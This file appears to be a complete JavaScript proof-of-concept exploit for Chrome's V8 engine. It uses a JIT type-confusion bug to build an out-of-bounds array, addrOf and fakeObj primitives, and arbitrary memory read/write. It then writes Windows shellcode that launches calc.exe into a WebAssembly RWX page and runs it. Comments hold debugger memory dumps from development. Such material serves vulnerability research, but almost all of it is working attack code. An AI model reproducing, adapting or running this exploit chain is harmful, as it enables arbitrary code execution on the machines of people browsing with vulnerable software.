function main() {
    var bs = new ArrayBuffer(8);
    var fs = new Float64Array(bs);
    var is = new BigUint64Array(bs);
    var us = new Uint32Array(bs);
    
    function log(_string) {
        console.log(_string)
    }
    
    function ftoi(val) {
        fs[0] = val;
        return is[0];
    }
    
    function myftoi(val) {
        fs[0] = val;
        return [us[0], us[1]];
    }
    
    function myitof(lower, upper) {
        us[0] = lower;
        us[1] = upper;
        return fs[0];
    }
    
    function itof(val) {
        is[0] = val;
        return fs[0];
    }
    
    function hex(_val) {
        return "0x"+_val.toString(16)
    }
    
    function foo(x) {
        let y = 0x7fffffff;
        if (x == NaN) y = NaN;
        if (x) y = -1;
        let z = y + 1;
        z >>= 31;
        z = Math.sign(z | 1);
        z = 0x7fffffff + 1 - z;
        let i = x ? 0 : z;
        i = 0 - Math.sign(i);
        let a = new Array(i);
        a.shift();
        let b = [1.1, 2.2, 3.3];
        return [a, b];
    }
    
    for (let i = 0; i < 100000; i++) foo(true);
    let [minus_1_arr, oob] = foo(false);
    log("[*] Created 2 arrays: 1 array of length -1 and 1 array of length 3")
    log("[*] The array of length 3 is the oob array which is not corrupted yet")
    log("[*] We will use the -1 length array to corrupt the oob array")
    function addrOf(k) {
        minus_1_arr[7] = k;
        return ftoi(oob[0]) & 0xffffffffn;
    }    
    function fakeObj(k) {
        oob[0] = itof(k);
        return minus_1_arr[7];
    }

    minus_1_arr[16] = 200; // changes
    log("[*] Increasing the length of the oob array to 100 get oob r/w");
    log(`[*] Sanity check: OOB array length: ${oob.length}`);
    for (let i = 0; i < 20; i++) {
        if (1===2) log(i + " - " + hex(ftoi(oob[i])));
    }
/*
This is in chrome
%DebugPrint(oob);
0:013> dq 0x012b90967741-1 (Address of oob)
0000012b`90967740  00002350`a6196701 0000759e`9f382cf1
0000012b`90967750  0000012b`90967719 000000c8`00000000
0000012b`90967760  0000759e`9f382881 00000002`00000000
0000012b`90967770  0000012b`909676f9 0000012b`90967741
0000012b`90967780  00002350`a61967a1 0000759e`9f382cf1
0000012b`90967790  0000012b`90967761 00000002`00000000
0000012b`909677a0  00002350`a61985a1 0000759e`9f382cf1
0000012b`909677b0  0000759e`9f382cf1 0000012b`90967781
0 - 0x3ff199999999999a
1 - 0x400199999999999a
2 - 0x400a666666666666
3 - 0x2350a6196701
4 - 0x759e9f382cf1
5 - 0x12b90967719
6 - 0xc800000000
7 - 0x759e9f382881
8 - 0x200000000
9 - 0x12b909676f9
*/
/*
DebugPrint: 000000B0080967DD: [JSArray]
 - map: 0x00b008241889 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x00b008208d75 <JSArray[0]>
 - elements: 0x00b0080967f5 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x00b0080406e1 <FixedArray[0]> {
    #length: 0x00b00818015d <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x00b0080967f5 <FixedDoubleArray[4]> {
           0: 4.73857e-270
           1: 1.1
           2: 1.2
           3: 1.3
 }
000000B008241889: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x00b008241861 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x00b008180449 <Cell value= 1>
 - instance descriptors #1: 0x00b0082093f9 <DescriptorArray[1]>
 - transitions #1: 0x00b008209445 <TransitionArray[4]>Transition array #1:
     0x00b008042ea1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x00b0082418b1 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x00b008208d75 <JSArray[0]>
 - constructor: 0x00b008208c49 <JSFunction Array (sfi = 000000B008188E35)>
 - dependent code: 0x00b0080401e5 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0
0:000> dq 0x00b0080967f5-1
000000b0`080967f4  00000008`08040a0d 080406e1`08241889
000000b0`08096804  3ff19999`9999999a 3ff33333`33333333
000000b0`08096814  3ff4cccc`cccccccd 08241889`08040355
000000b0`08096824  08040355`080406e1 3ff19999`080967dd
000000b0`08096834  00000002`0804096d 3ff19999`080967dd
000000b0`08096844  00000002`0804096d 00000000`080967dd
000000b0`08096854  00000007`08040549 36393038`00000007
000000b0`08096864  08040549`00646437 00000009`00000007
0:000> dq 000000B0080967DD-1
000000b0`080967dc  080406e1`08241889 00000008`080967f5
000000b0`080967ec  082111f1`08043465 00000008`08040a0d
000000b0`080967fc  080406e1`08241889 3ff19999`9999999a
000000b0`0809680c  3ff33333`33333333 3ff4cccc`cccccccd
000000b0`0809681c  08241889`08040355 08040355`080406e1
000000b0`0809682c  3ff19999`080967dd 00000002`0804096d
000000b0`0809683c  3ff19999`080967dd 00000002`0804096d
000000b0`0809684c  00000000`080967dd 00000007`08040549
*/
/*
%DebugPrint(oob);
let test = [oob[3],4.3,4.4,4.5];
%DebugPrint(test);
print(hex(addrOf(test)));
print("==============");
let test_addr_number = addrOf(test);
// ftoi(oob[0]) returns 0x3ff199990832ba01 where 0832ba01 is the address of test 
let should_be_test = fakeObj(test_addr_number);
%DebugPrint(should_be_test);
print("$$$$$$$$$$$$$");
let fake = fakeObj(test_addr_number+0x20n);
*/

    let test = [oob[3],4.3,4.4,4.5];
    let test_addr_number = addrOf(test);
    let fake = fakeObj(test_addr_number+0x20n);

    function arb_read_compressed(_address) {
        test[1] = myitof(Number(_address)-0x8, 0x8);
        return ftoi(fake[0]);
    }

    function arb_writ_compressed(_address, _lower, _upper) {
        test[1] = myitof(Number(_address)-0x8, 0x8);
        fake[0] = myitof(_lower, _upper);
    }
    
    let ab = new ArrayBuffer(0x1024);
    let abu8 = new Uint8Array(ab);
    let ab32 = new Uint32Array(ab);
    let calc_shellcode = new Uint8Array(
        [   0xca, 0xca, 0xca, 0xca, 0xca,
            0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
            0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
            0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
            0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
            0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
            0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
            0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
            0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
            0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
            0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
            0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
            0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
            0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
            0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
            0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
            0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
            0x65, 0x78, 0x65, 0x00, 0x90, 0x90, 0x90, 0x90
        ]
    );
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    
    // set the backing store of the ab to the pointer to the rwx region
    var ab_backing_store = arb_read_compressed(addrOf(ab)+0x58n);
    var rwx = arb_read_compressed(addrOf(wasmInstance)+0x68n);
    var rwx_f = itof(rwx);
    var [rwx_l, rwx_u] = myftoi(rwx_f)
    arb_writ_compressed(addrOf(ab)+0x58n, Number(rwx_l), Number(rwx_u));
    abu8.set(calc_shellcode);
    func();

}

main()